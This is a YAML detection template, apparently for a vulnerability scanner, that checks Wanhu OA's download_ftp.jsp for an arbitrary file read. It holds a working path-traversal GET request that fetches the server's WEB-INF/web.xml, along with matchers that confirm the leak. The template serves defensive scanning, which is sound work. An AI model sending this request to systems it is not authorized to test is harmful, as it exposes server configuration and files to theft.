id: "wanhu-download-ftp-file-read"
name: "Wanhu OA download_ftp.jsp - Arbitrary File Read"
severity: "high"
description: "There is an arbitrary file download vulnerability in the Wanhu OA download_ftp.jsp file. An attacker can download any file on the server through the vulnerability."
tech:
  - "tomcat"
  - "java"
tags:
  - "wanhu"
  - "lfi"
  - "vuln"
reference: "http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html"
spaExclusion: true
request:
  method: "GET"
  path: "/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<?xml version="
      - "web-app"
      - "display-name"
    condition: "and"
  - type: "status"
    status:
      - 200
